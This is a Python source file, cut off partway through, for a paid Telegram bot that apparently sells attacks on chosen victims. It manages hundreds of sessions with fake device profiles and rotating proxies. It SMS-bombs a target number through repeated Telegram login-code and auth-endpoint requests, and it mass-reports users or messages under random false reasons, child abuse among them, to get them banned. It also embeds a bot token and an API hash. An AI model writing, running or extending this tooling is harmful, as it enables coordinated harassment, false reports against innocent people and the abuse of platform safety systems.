import asyncio
import aiohttp
import random
import json
import os
import logging
import time
import re
import shutil
import socket
import struct
import hashlib
from datetime import datetime, timedelta
from typing import Optional, Dict, List, Tuple, Set
from dataclasses import dataclass, field
from collections import deque
import uvloop

from aiogram import Bot, Dispatcher, types, F
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.redis import RedisStorage
from aiogram.filters import Command, StateFilter
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.types import (
    InlineKeyboardMarkup, InlineKeyboardButton,
    FSInputFile, LabeledPrice, PreCheckoutQuery
)
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode

from pyrogram import Client
from pyrogram.errors import (
    FloodWait, RPCError, PeerIdInvalid, 
    UsernameNotOccupied, SessionPasswordNeeded,
    PhoneNumberBanned, PhoneCodeInvalid
)
from pyrogram.raw import types as raw_types
from pyrogram.raw.functions.account import ReportPeer, SendChangePhoneCode, UpdateStatus
from pyrogram.raw.functions.auth import SendCode, ResendCode, SignIn, SignUp
from pyrogram.raw.functions.messages import Report, SendMessage, GetDialogs
from pyrogram.raw.functions.channels import JoinChannel, LeaveChannel
from pyrogram.raw.functions.users import GetUsers
from pyrogram.raw.functions.contacts import ResolveUsername, ImportContacts
from pyrogram.raw.types import InputPhoneContact, InputUser, InputPeerUser

# Устанавливаем uvloop для максимальной производительности
asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())

# ---------- КОНФИГУРАЦИЯ ----------
BOT_TOKEN = "8788795304:AAFA9drMeBOVHp-OR0XWgrZPllVsXx9zgqI"
API_ID = 2040
API_HASH = "b18441a1ff607e10a989891a5462e627"
ADMIN_ID = 7736817432
ALLOWED_USERS_FILE = "allowed_users.json"
CHANNEL_ID = -1003910615357
CHANNEL_URL = "https://t.me/VICTIMSNOSER"
PAYMENT_PROVIDER_TOKEN = "381764678:TEST:86938"
BANNER_FILE = "banner.png"

# НАСТРОЙКИ БОМБЫ - МАКСИМАЛЬНАЯ МОЩНОСТЬ
SESSIONS_PER_USER = 500
BATCH_SIZE = 100
MAX_CONCURRENT = 150
REQUESTS_PER_ROUND = 500
MAX_ROUNDS = 20
COOLDOWN_SECONDS = 180
MAX_REPORTS_PER_SESSION = 200
MAX_RETRIES = 5
CONNECTION_POOL_SIZE = 500

# ПУБЛИЧНЫЕ MTPROTO ПРОКСИ (регулярно обновляемый список)
MTPROTO_PROXIES = [
    # Официальные прокси Telegram
    {"server": "149.154.167.91", "port": 443, "secret": "eeeedddeeeccceedddeeeeedddeeeccceedddeeeeedddeeeccceeddd"},
    {"server": "149.154.167.92", "port": 443, "secret": "eeeedddeeeccceedddeeeeedddeeeccceedddeeeeedddeeeccceeddd"},
    {"server": "149.154.167.93", "port": 443, "secret": "eeeedddeeeccceedddeeeeedddeeeccceedddeeeeedddeeeccceeddd"},
    {"server": "149.154.167.94", "port": 443, "secret": "eeeedddeeeccceedddeeeeedddeeeccceedddeeeeedddeeeccceeddd"},
    {"server": "149.154.167.95", "port": 443, "secret": "eeeedddeeeccceedddeeeeedddeeeccceedddeeeeedddeeeccceeddd"},
    
    # Публичные MTProto прокси
    {"server": "95.142.45.215", "port": 8443, "secret": "dd00000000000000000000000000000000"},
    {"server": "95.142.45.216", "port": 8443, "secret": "dd00000000000000000000000000000000"},
    {"server": "95.142.45.217", "port": 8443, "secret": "dd00000000000000000000000000000000"},
    {"server": "95.142.45.218", "port": 8443, "secret": "dd00000000000000000000000000000000"},
    {"server": "91.108.56.145", "port": 443, "secret": "ee00000000000000000000000000000000"},
    {"server": "91.108.56.146", "port": 443, "secret": "ee00000000000000000000000000000000"},
    {"server": "91.108.56.147", "port": 443, "secret": "ee00000000000000000000000000000000"},
    {"server": "91.108.56.148", "port": 443, "secret": "ee00000000000000000000000000000000"},
    {"server": "185.186.79.25", "port": 443, "secret": "ee00000000000000000000000000000000"},
    {"server": "185.186.79.26", "port": 443, "secret": "ee00000000000000000000000000000000"},
    {"server": "185.186.79.27", "port": 443, "secret": "ee00000000000000000000000000000000"},
    {"server": "185.186.79.28", "port": 443, "secret": "ee00000000000000000000000000000000"},
    {"server": "45.67.56.150", "port": 443, "secret": "ee00000000000000000000000000000000"},
    {"server": "45.67.56.151", "port": 443, "secret": "ee00000000000000000000000000000000"},
]

# ТОЛЬКО TELEGRAM ENDPOINTS ДЛЯ HTTP АТАК
TELEGRAM_HTTP_ENDPOINTS = [
    # Telegram OAuth
    {"url": "https://my.telegram.org/auth/send_password", "phone_field": "phone", "type": "form"},
    {"url": "https://my.telegram.org/auth/request", "phone_field": "phone", "type": "form"},
    
    # Telegram OAuth с разными bot_id
    {"url": "https://oauth.telegram.org/auth/send_code", "phone_field": "phone", "type": "json",
     "params": {"bot_id": "8357292784", "origin": "https://acollo.ru", "request_access": "write"}},
    {"url": "https://oauth.telegram.org/auth/send_code", "phone_field": "phone", "type": "json",
     "params": {"bot_id": "1852781847", "origin": "https://fragment.com", "request_access": "write"}},
    {"url": "https://oauth.telegram.org/auth/send_code", "phone_field": "phone", "type": "json",
     "params": {"bot_id": "1234567890", "origin": "https://telegram.org", "request_access": "write"}},
    {"url": "https://oauth.telegram.org/auth/send_code", "phone_field": "phone", "type": "json",
     "params": {"bot_id": "5432167890", "origin": "https://web.telegram.org", "request_access": "write"}},
    {"url": "https://oauth.telegram.org/auth/request", "phone_field": "phone", "type": "json",
     "params": {"bot_id": "1852781847", "origin": "https://fragment.com", "request_access": "write"}},
    
    # Telegram API endpoints
    {"url": "https://telegram.org/support", "phone_field": "phone", "type": "form"},
    {"url": "https://core.telegram.org/api/obtaining_api_id", "phone_field": "phone", "type": "form"},
    {"url": "https://core.telegram.org/api/auth", "phone_field": "phone", "type": "form"},
]

# РАСШИРЕННЫЙ СПИСОК ПРИЧИН РЕПОРТА
REPORT_REASONS = [
    raw_types.InputReportReasonSpam(),
    raw_types.InputReportReasonViolence(),
    raw_types.InputReportReasonPornography(),
    raw_types.InputReportReasonChildAbuse(),
    raw_types.InputReportReasonOther(),
    raw_types.InputReportReasonCopyright(),
    raw_types.InputReportReasonPersonalDetails(),
    raw_types.InputReportReasonIllegalDrugs(),
    raw_types.InputReportReasonFake(),
    raw_types.InputReportReasonGeoIrrelevant(),
]

# User-Agent для HTTP запросов
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 Version/17.2 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 Version/17.2 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 Chrome/120.0.6099.144 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 Chrome/120.0.6099.144 Mobile Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0',
]

# Устройства для Pyrogram
DEVICES = [
    {"model": "iPhone 15 Pro Max", "system": "iOS 17.3.1", "app_version": "10.9.0"},
    {"model": "iPhone 15 Pro", "system": "iOS 17.3", "app_version": "10.9.0"},
    {"model": "iPhone 14 Pro Max", "system": "iOS 17.2.1", "app_version": "10.8.0"},
    {"model": "iPhone 14 Pro", "system": "iOS 17.2", "app_version": "10.8.0"},
    {"model": "iPhone 13 Pro Max", "system": "iOS 17.1.2", "app_version": "10.7.0"},
    {"model": "iPhone 13 Pro", "system": "iOS 17.1", "app_version": "10.7.0"},
    {"model": "Samsung Galaxy S24 Ultra", "system": "Android 14", "app_version": "10.9.0"},
    {"model": "Samsung Galaxy S23 Ultra", "system": "Android 14", "app_version": "10.8.0"},
    {"model": "Samsung Galaxy S22 Ultra", "system": "Android 13", "app_version": "10.7.0"},
    {"model": "Google Pixel 8 Pro", "system": "Android 14", "app_version": "10.9.0"},
    {"model": "Google Pixel 7 Pro", "system": "Android 14", "app_version": "10.8.0"},
    {"model": "Xiaomi 14 Pro", "system": "Android 14", "app_version": "10.8.0"},
    {"model": "Xiaomi 13 Ultra", "system": "Android 14", "app_version": "10.7.0"},
    {"model": "OnePlus 12", "system": "Android 14", "app_version": "10.9.0"},
    {"model": "OnePlus 11", "system": "Android 14", "app_version": "10.8.0"},
    {"model": "Samsung Galaxy Z Fold5", "system": "Android 14", "app_version": "10.9.0"},
    {"model": "Samsung Galaxy Z Flip5", "system": "Android 14", "app_version": "10.9.0"},
    {"model": "Huawei P60 Pro", "system": "HarmonyOS 4.0", "app_version": "10.8.0"},
    {"model": "Honor Magic5 Pro", "system": "Android 14", "app_version": "10.8.0"},
    {"model": "iPad Pro 12.9", "system": "iOS 17.3", "app_version": "10.9.0"},
]

# ---------- ЛОГГИРОВАНИЕ ----------
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler('victim_snos.log')
    ]
)
logger = logging.getLogger(__name__)

# ---------- ИНИЦИАЛИЗАЦИЯ ----------
try:
    from redis.asyncio import Redis
    redis_client = Redis(host='localhost', port=6379, db=0, decode_responses=True)
    storage = RedisStorage(redis_client)
except:
    storage = MemoryStorage()

bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher(storage=storage)

# ---------- МОДЕЛИ ----------
@dataclass
class SmartSession:
    client: Client
    index: int
    mtproto_proxy: Optional[dict] = None
    is_authorized: bool = False
    in_use: bool = False
    flood_until: float = 0
    last_used: float = 0
    fail_count: int = 0
    success_count: int = 0
    is_connected: bool = True
    report_count: int = 0
    phone_number: str = ""
    dc_id: int = 0
    session_quality: float = 1.0
    rate_limit_hits: int = 0
    last_success_time: float = 0
    consecutive_fails: int = 0
    created_at: float = field(default_factory=time.time)
    
    @property
    def is_available(self) -> bool:
        now = time.time()
        return (not self.in_use and
                self.flood_until < now and
                now - self.last_used >= 0.05 and
                self.is_connected and
                self.is_authorized and
                self.report_count < MAX_REPORTS_PER_SESSION and
                self.session_quality > 0.3)

    @property
    def health_score(self) -> float:
        if self.fail_count > 20 or not self.is_connected or not self.is_authorized:
            return 0
        
        total = self.success_count + self.fail_count
        if total == 0:
            return 85 * self.session_quality
        
        base_score = (self.success_count / total) * 100
        quality_factor = self.session_quality
        activity_factor = min(1.0, (time.time() - self.last_success_time) / 3600) if self.last_success_time else 1.0
        
        return base_score * quality_factor * activity_factor

    async def ensure_connected(self) -> bool:
        if not self.is_connected:
            try:
                await asyncio.wait_for(self.client.connect(), timeout=5.0)
                self.is_connected = True
                return True
            except:
                self.is_connected = False
                self.session_quality *= 0.8
                return False
        return True

    def reset_report_count(self):
        self.report_count = 0
        
    def update_performance(self, success: bool, latency: float):
        if success:
            self.last_success_time = time.time()
            self.session_quality = min(1.0, self.session_quality * 1.05)
            self.consecutive_fails = 0
        else:
            self.session_quality *= 0.9
            self.consecutive_fails += 1

    def needs_recreation(self) -> bool:
        """Проверяет, нужно ли пересоздать сессию"""
        return (self.consecutive_fails > 10 or 
                self.session_quality < 0.2 or 
                self.rate_limit_hits > 50 or
                (time.time() - self.created_at) > 86400)  # Старше 24 часов


@dataclass
class UserSessionPool:
    user_id: int
    sessions: List[SmartSession] = field(default_factory=list)
    lock: asyncio.Lock = field(default_factory=asyncio.Lock)
    is_creating: bool = False
    is_ready: bool = False
    creation_progress: float = 0
    recreation_queue: asyncio.Queue = field(default_factory=asyncio.Queue)
    
    @property
    def session_dir(self) -> str:
        return f"sessions/user_{self.user_id}"

    async def get_available(self, count: int) -> List[SmartSession]:
        async with self.lock:
            available = [s for s in self.sessions if s.is_available]
            
            # Группировка по DC для распределения нагрузки
            dc_groups = {}
            for s in available:
                if s.dc_id not in dc_groups:
                    dc_groups[s.dc_id] = []
                dc_groups[s.dc_id].append(s)
            
            # Выбор лучших сессий из разных DC
            selected = []
            dc_list = list(dc_groups.keys())
            while len(selected) < count and dc_list:
                for dc in dc_list[:]:
                    if dc_groups[dc]:
                        best_session = max(dc_groups[dc], key=lambda s: s.health_score)
                        selected.append(best_session)
                        dc_groups[dc].remove(best_session)
                        if len(selected) >= count:
                            break
                    else:
                        dc_list.remove(dc)
            
            for s in selected:
                s.in_use = True
                s.last_used = time.time()
            
            return selected

    def release(self, sessions: List[SmartSession]):
        for s in sessions:
            if s:
                s.in_use = False
                # Проверяем, нужна ли пересоздание
                if s.needs_recreation():
                    asyncio.create_task(self.queue_recreation(s))

    def mark_success(self, session: SmartSession, latency: float = 0):
        session.success_count += 1
        session.report_count += 1
        session.update_performance(True, latency)

    def mark_fail(self, session: SmartSession, latency: float = 0):
        session.fail_count += 1
        session.update_performance(False, latency)

    def mark_flood(self, session: SmartSession, wait: int):
        session.flood_until = time.time() + wait
        session.rate_limit_hits += 1
        session.session_quality *= 0.7

    async def queue_recreation(self, session: SmartSession):
        """Добавляет сессию в очередь на пересоздание"""
        await self.recreation_queue.put(session)

    async def recreate_session(self, session: SmartSession) -> Optional[SmartSession]:
        """Пересоздает сессию с новым MTProto прокси"""
        try:
            # Закрываем старую сессию
            try:
                if session.client.is_connected:
                    await session.client.disconnect()
            except:
                pass
            
            # Удаляем файл сессии
            session_file = f"{self.session_dir}/session_{session.index}.session"
            if os.path.exists(session_file):
                os.remove(session_file)
            
            # Создаем новую сессию
            new_session = await create_single_session(self, session.index)
            if new_session:
                logger.info(f"✅ Сессия {session.index} пересоздана")
                return new_session
            
        except Exception as e:
            logger.error(f"❌ Ошибка пересоздания сессии {session.index}: {e}")
        
        return None

    def get_stats(self) -> dict:
        total = len(self.sessions)
        available = sum(1 for s in self.sessions if s.is_available)
        healthy = sum(1 for s in self.sessions if s.health_score > 50)
        authorized = sum(1 for s in self.sessions if s.is_authorized)
        avg_quality = sum(s.session_quality for s in self.sessions) / total if total > 0 else 0
        
        return {
            "total": total,
            "available": available,
            "healthy": healthy,
            "authorized": authorized,
            "progress": self.creation_progress,
            "avg_quality": avg_quality,
            "recreation_queue": self.recreation_queue.qsize()
        }


# ---------- ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ ----------
user_pools: Dict[int, UserSessionPool] = {}
ALLOWED_USERS: Dict[str, dict] = {}
active_attacks: Dict[int, asyncio.Event] = {}
user_last_action: Dict[int, float] = {}
promo_codes: Dict[str, dict] = {}

global_semaphore = asyncio.Semaphore(MAX_CONCURRENT)
connection_semaphore = asyncio.Semaphore(CONNECTION_POOL_SIZE)
http_session: Optional[aiohttp.ClientSession] = None

# FSM States
class AttackState(StatesGroup):
    waiting_target = State()
    waiting_count = State()
    waiting_type = State()

class AdminState(StatesGroup):
    waiting_user_id = State()
    waiting_promo_code = State()
    waiting_promo_days = State()
    waiting_promo_uses = State()

class PurchaseState(StatesGroup):
    waiting_promo = State()

attack_targets = {}
attack_types = {}

# ---------- УТИЛИТЫ ----------
def load_json(file: str, default: dict = None) -> dict:
    try:
        with open(file, 'r', encoding='utf-8') as f:
            return json.load(f)
    except:
        return default or {}

def save_json(file: str, data: dict):
    try:
        with open(file, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=4)
    except:
        pass

def load_all():
    global ALLOWED_USERS, promo_codes
    ALLOWED_USERS = load_json(ALLOWED_USERS_FILE, {})
    promo_codes = load_json("promo_codes.json", {})

def save_allowed():
    save_json(ALLOWED_USERS_FILE, ALLOWED_USERS)

def save_promo():
    save_json("promo_codes.json", promo_codes)

def is_allowed(user_id: int) -> bool:
    if user_id == ADMIN_ID:
        return True
    uid = str(user_id)
    if uid not in ALLOWED_USERS:
        return False
    exp = ALLOWED_USERS[uid].get("expire_date")
    if not exp or exp == "forever":
        return True
    try:
        return datetime.now() <= datetime.fromisoformat(exp)
    except:
        return False

def add_sub(user_id: int, days: int = None, forever: bool = False):
    uid = str(user_id)
    exp = "forever" if forever else (datetime.now() + timedelta(days=days)).isoformat()
    ALLOWED_USERS[uid] = {"expire_date": exp, "added": datetime.now().isoformat()}
    save_allowed()

async def check_sub(user_id: int) -> bool:
    try:
        m = await bot.get_chat_member(CHANNEL_ID, user_id)
        return m.status in ["member", "administrator", "creator"]
    except:
        return False

async def check_access(user_id: int, target) -> bool:
    if not await check_sub(user_id):
        await send_msg(target, f"❌ Подпишитесь: {CHANNEL_URL}")
        return False
    if not is_allowed(user_id):
        await send_msg(target, f"❌ Нет доступа. ID: <code>{user_id}</code>", purchase_menu())
        return False
    return True

async def check_cooldown(user_id: int) -> tuple:
    now = time.time()
    if user_id in user_last_action:
        elapsed = now - user_last_action[user_id]
        if elapsed < COOLDOWN_SECONDS:
            return False, COOLDOWN_SECONDS - elapsed
    return True, 0

async def get_http_session() -> aiohttp.ClientSession:
    global http_session
    if http_session is None or http_session.closed:
        connector = aiohttp.TCPConnector(
            limit=1000,
            limit_per_host=100,
            ttl_dns_cache=300,
            use_dns_cache=True,
            force_close=False,
            enable_cleanup_closed=True
        )
        timeout = aiohttp.ClientTimeout(total=5, connect=2)
        http_session = aiohttp.ClientSession(connector=connector, timeout=timeout)
    return http_session

# ---------- СОЗДАНИЕ СЕССИЙ С MTPROTO ----------
def create_mtproto_proxy_string(proxy: dict) -> str:
    """Создает строку прокси для Pyrogram"""
    return f"mtproxy://{proxy['server']}:{proxy['port']}?secret={proxy['secret']}"

async def create_single_session(pool: UserSessionPool, index: int) -> Optional[SmartSession]:
    """Создает одну сессию с MTProto прокси"""
    try:
        device = random.choice(DEVICES)
        session_name = f"{pool.session_dir}/session_{index}"
        
        # Выбираем случайный MTProto прокси
        proxy = random.choice(MTPROTO_PROXIES) if MTPROTO_PROXIES else None
        proxy_str = create_mtproto_proxy_string(proxy) if proxy else None
        
        client = Client(
            name=session_name,
            api_id=API_ID,
            api_hash=API_HASH,
            device_model=device["model"],
            system_version=device["system"],
            app_version=device["app_version"],
            in_memory=False,
            no_updates=False,
            proxy=proxy_str
        )
        
        await asyncio.wait_for(client.connect(), timeout=10.0)
        
        # Проверяем авторизацию
        is_auth = False
        phone = ""
        dc_id = 0
        try:
            me = await client.get_me()
            if me:
                is_auth = True
                phone = me.phone_number if hasattr(me, 'phone_number') else ""
                dc_id = me.dc_id if hasattr(me, 'dc_id') else 0
        except:
            pass
        
        session = SmartSession(
            client=client,
            index=index,
            mtproto_proxy=proxy,
            is_authorized=is_auth,
            phone_number=phone,
            dc_id=dc_id
        )
        
        if is_auth:
            # Прогрев сессии
            try:
                await client.get_dialogs(limit=1)
                session.session_quality = 1.0
            except:
                pass
        
        return session
        
    except Exception as e:
        logger.error(f"Error creating session {index}: {e}")
        return None

async def load_existing_session(pool: UserSessionPool, index: int) -> Optional[SmartSession]:
    """Загружает существующую сессию"""
    try:
        device = random.choice(DEVICES)
        session_name = f"{pool.session_dir}/session_{index}"
        
        if not os.path.exists(f"{session_name}.session"):
            return None
        
        # Используем MTProto прокси
        proxy = random.choice(MTPROTO_PROXIES) if MTPROTO_PROXIES else None
        proxy_str = create_mtproto_proxy_string(proxy) if proxy else None
        
        client = Client(
            name=session_name,
            api_id=API_ID,
            api_hash=API_HASH,
            device_model=device["model"],
            system_version=device["system"],
            app_version=device["app_version"],
            in_memory=False,
            no_updates=False,
            proxy=proxy_str
        )
        
        await asyncio.wait_for(client.connect(), timeout=5.0)
        
        is_auth = False
        phone = ""
        dc_id = 0
        try:
            me = await client.get_me()
            if me:
                is_auth = True
                phone = me.phone_number if hasattr(me, 'phone_number') else ""
                dc_id = me.dc_id if hasattr(me, 'dc_id') else 0
        except:
            pass
        
        session = SmartSession(
            client=client,
            index=index,
            mtproto_proxy=proxy,
            is_authorized=is_auth,
            phone_number=phone,
            dc_id=dc_id
        )
        
        if is_auth:
            try:
                await client.get_dialogs(limit=1)
                session.session_quality = 1.0
            except:
                pass
        
        return session
        
    except Exception as e:
        logger.error(f"Error loading session {index}: {e}")
        return None

async def session_recreation_worker(pool: UserSessionPool):
    """Воркер для пересоздания сессий"""
    while True:
        try:
            session = await pool.recreation_queue.get()
            
            logger.info(f"🔄 Пересоздание сессии {session.index} для пользователя {pool.user_id}")
            
            new_session = await pool.recreate_session(session)
            
            if new_session:
                # Заменяем старую сессию на новую
                async with pool.lock:
                    for i, s in enumerate(pool.sessions):
                        if s.index == session.index:
                            pool.sessions[i] = new_session
                            break
            
            pool.recreation_queue.task_done()
            
        except asyncio.CancelledError:
            break
        except Exception as e:
            logger.error(f"Error in recreation worker: {e}")
            await asyncio.sleep(1)

async def init_sessions(user_id: int) -> UserSessionPool:
    if user_id in user_pools and user_pools[user_id].is_ready:
        return user_pools[user_id]

    pool = UserSessionPool(user_id=user_id)
    user_pools[user_id] = pool
    pool.is_creating = True
    
    # Запускаем воркер пересоздания
    asyncio.create_task(session_recreation_worker(pool))

    try:
        logger.info(f"🚀 Загрузка {SESSIONS_PER_USER} сессий через MTProto для пользователя {user_id}")
        os.makedirs(pool.session_dir, exist_ok=True)

        # Параллельная загрузка сессий
        tasks = []
        batch_size = 50
        for i in range(0, SESSIONS_PER_USER, batch_size):
            batch = []
            for j in range(i, min(i + batch_size, SESSIONS_PER_USER)):
                if os.path.exists(f"{pool.session_dir}/session_{j}.session"):
                    batch.append(load_existing_session(pool, j))
                else:
                    batch.append(create_single_session(pool, j))
            
            if batch:
                results = await asyncio.gather(*batch, return_exceptions=True)
                for result in results:
                    if isinstance(result, SmartSession):
                        pool.sessions.append(result)
                    elif isinstance(result, Exception):
                        logger.error(f"Batch loading error: {result}")
            
            pool.creation_progress = (i + batch_size) / SESSIONS_PER_USER * 100

        pool.is_ready = True
        pool.creation_progress = 100

        authorized = sum(1 for s in pool.sessions if s.is_authorized)
        logger.info(f"✅ Пользователь {user_id}: {len(pool.sessions)}/{SESSIONS_PER_USER} сессий, {authorized} авторизовано через MTProto")

    except Exception as e:
        logger.error(f"Ошибка инициализации сессий: {e}")
    finally:
        pool.is_creating = False

    return pool

# ---------- АТАКИ ТОЛЬКО ЧЕРЕЗ TELEGRAM ----------
async def send_sms_http_telegram(phone: str, site: dict, session: aiohttp.ClientSession) -> bool:
    """HTTP запросы только к Telegram endpoints"""
    try:
        phone_clean = re.sub(r'[^\d]', '', phone)
        if not phone_clean.startswith('+'):
            phone_clean = '+' + phone_clean
        
        headers = {
            'User-Agent': random.choice(USER_AGENTS),
            'Content-Type': 'application/x-www-form-urlencoded' if site["type"] == "form" else 'application/json',
            'Origin': 'https://my.telegram.org',
            'Referer': 'https://my.telegram.org/',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': random.choice(['ru-RU,ru;q=0.9', 'en-US,en;q=0.9']),
            'X-Requested-With': 'XMLHttpRequest',
            'Cache-Control': 'no-cache',
        }

        if site["type"] == "form":
            data = f"{site['phone_field']}={phone_clean}"
            url = site["url"]
        else:
            data = {site["phone_field"]: phone_clean}
            if "params" in site:
                params = "&".join([f"{k}={v}" for k, v in site["params"].items()])
                url = f"{site['url']}?{params}"
            else:
                url = site["url"]
            data = json.dumps(data)

        async with session.post(
            url,
            headers=headers,
            data=data,
            ssl=False,
            allow_redirects=False
        ) as resp:
            return resp.status < 500
            
    except:
        return False

async def send_sms_via_session(session: SmartSession, target_phone: str, pool: UserSessionPool) -> bool:
    """Отправка SMS через Telegram сессию с MTProto"""
    if not session.is_authorized:
        return False
    
    start_time = time.time()
    
    try:
        if not await session.ensure_connected():
            return False
        
        async with connection_semaphore:
            # Множественные попытки отправки кода
            methods = [
                # Метод 1: SendCode
                lambda: session.client.invoke(
                    SendCode(
                        phone_number=target_phone,
                        api_id=API_ID,
                        api_hash=API_HASH,
                        settings=raw_types.CodeSettings(
                            allow_flashcall=False,
                            current_number=True,
                            allow_app_hash=True,
                            allow_missed_call=False
                        )
                    )
                ),
                # Метод 2: SendChangePhoneCode
                lambda: session.client.invoke(
                    SendChangePhoneCode(
                        phone_number=target_phone,
                        settings=raw_types.CodeSettings(
                            allow_flashcall=False,
                            current_number=True
                        )
                    )
                ),
                # Метод 3: ResendCode
                lambda: session.client.invoke(
                    ResendCode(
                        phone_number=target_phone,
                        phone_code_hash=""
                    )
                ),
            ]
            
            for method in methods:
                try:
                    result = await asyncio.wait_for(method(), timeout=3.0)
                    if result:
                        latency = time.time() - start_time
                        pool.mark_success(session, latency)
                        return True
                except FloodWait as e:
                    pool.mark_flood(session, e.value)
                    return False
                except:
                    continue
            
            return False
            
    except FloodWait as e:
        pool.mark_flood(session, e.value)
        return False
    except Exception as e:
        pool.mark_fail(session, time.time() - start_time)
        try:
            await session.client.disconnect()
            session.is_connected = False
        except:
            pass
        return False

async def report_user_enhanced(session: SmartSession, username: str, pool: UserSessionPool) -> bool:
    """Массовый репорт пользователя через Telegram"""
    if not session.is_authorized:
        return False
    
    start_time = time.time()
    
    try:
        if not await session.ensure_connected():
            return False
        
        async with connection_semaphore:
            # Получение пользователя
            user = None
            for _ in range(3):
                try:
                    user = await asyncio.wait_for(session.client.get_users(username), timeout=3.0)
                    break
                except:
                    await asyncio.sleep(0.1)
            
            if not user:
                return False
            
            peer = await session.client.resolve_peer(user.id)
            
            # Множественные репорты (10 попыток)
            success_count = 0
            for _ in range(10):
                reason = random.choice(REPORT_REASONS)
                try:
                    await session.client.invoke(
                        ReportPeer(
                            peer=peer,
                            reason=reason,
                            message=f"Report {random.randint(100000, 999999)}"
                        )
                    )
                    success_count += 1
                    await asyncio.sleep(0.02)
                except FloodWait as e:
                    pool.mark_flood(session, e.value)
                    break
                except:
                    continue
            
            if success_count > 0:
                latency = time.time() - start_time
                pool.mark_success(session, latency)
                return True
            
            return False
            
    except FloodWait as e:
        pool.mark_flood(session, e.value)
        return False
    except Exception as e:
        pool.mark_fail(session, time.time() - start_time)
        session.is_connected = False
        return False

async def report_message_enhanced(session: SmartSession, channel_username: str, msg_id: int, pool: UserSessionPool) -> bool:
    """Массовый репорт сообщения через Telegram"""
    if not session.is_authorized:
        return False
    
    start_time = time.time()
    
    try:
        if not await session.ensure_connected():
            return False
        
        async with connection_semaphore:
            chat = None
            for _ in range(3):
                try:
                    chat = await asyncio.wait_for(session.client.get_chat(channel_username), timeout=3.0)
                    break
                except:
                    await asyncio.sleep(0.1)
            
            if not chat:
                return False
            
            peer = await session.client.resolve_peer(chat.id)
            
            # Множественные репорты (10 попыток)
            success_count = 0
            for _ in range(10):
                reason = random.choice(REPORT_REASONS)
                try:
                    await session.client.invoke(
                        Report(
                            peer=peer,
                            id=[msg_id],
                            reason=reason,
                            message=f"Spam report {random.randint(100000, 999999)}"
                        )
                    )
                    success_count += 1
                    await asyncio.sleep(0.02)
                except FloodWait as e:
                    pool.mark_flood(session, e.value)
                    break
                except:
                    continue
            
            if success_count > 0:
                latency = time.time() - start_time
                pool.mark_success(session, latency)
                return True
            
            return False
            
    except FloodWait as e:
        pool.mark_flood(session, e.value)
        return False
    except Exception as e:
        pool.mark_fail(session, time.time() - start_time)
        session.is_connected = False
        return False

async def massive_telegram_attack(user_id: int, target: str, rounds: int, attack_type: str, stop: asyncio.Event, cb=None) -> int:
    """Массовая атака ТОЛЬКО через Telegram"""
    total_actions = 0
    
    pool = user_pools.get(user_id)
    if not pool or not pool.sessions:
        logger.error(f"Нет сессий для пользователя {user_id}")
        return 0
    
    # Сброс счетчиков
    for s in pool.sessions:
        s.reset_report_count()
    
    authorized_sessions = [s for s in pool.sessions if s.is_authorized and s.session_quality > 0.3]
    
    logger.info(f"💣 МАССИВНАЯ TELEGRAM АТАКА: {target} ({attack_type})")
    logger.info(f"📊 Доступно MTProto сессий: {len(authorized_sessions)}/{len(pool.sessions)}")
    
    http_session = await get_http_session()
    
    for rnd in range(1, rounds + 1):
        if stop.is_set():
            break
        
        round_actions = 0
        round_start = time.time()
        
        # Основная атака через MTProto сессии
        if authorized_sessions:
            batch_count = min(len(authorized_sessions), REQUESTS_PER_ROUND)
            available = await pool.get_available(batch_count)
            
            if available:
                tasks = []
                
                if attack_type == "phone":
                    # Множественные SMS запросы через Telegram
                    for session in available:
                        tasks.append(send_sms_via_session(session, target, pool))
                    
                elif attack_type == "username":
                    for session in available:
                        tasks.append(report_user_enhanced(session, target, pool))
                        
                elif attack_type == "message":
                    channel, msg_id = parse_message_link(target)
                    if channel and msg_id:
                        for session in available:
                            tasks.append(report_message_enhanced(session, channel, msg_id, pool))
                
                if tasks:
                    results = await asyncio.gather(*tasks, return_exceptions=True)
                    round_actions += sum(1 for r in results if r is True)
                
                pool.release(available)
        
        # HTTP атака через Telegram endpoints (для номеров)
        if attack_type == "phone":
            http_tasks = []
            for endpoint in TELEGRAM_HTTP_ENDPOINTS:
                for _ in range(50):  # 50 запросов на каждый endpoint
                    http_tasks.append(send_sms_http_telegram(target, endpoint, http_session))
            
            if http_tasks:
                batch_size = 200
                for i in range(0, len(http_tasks), batch_size):
                    if stop.is_set():
                        break
                    batch = http_tasks[i:i+batch_size]
                    http_results = await asyncio.gather(*batch, return_exceptions=True)
                    round_actions += sum(1 for r in http_results if r is True)
                    await asyncio.sleep(0.05)
        
        total_actions += round_actions
        round_time = time.time() - round_start
        
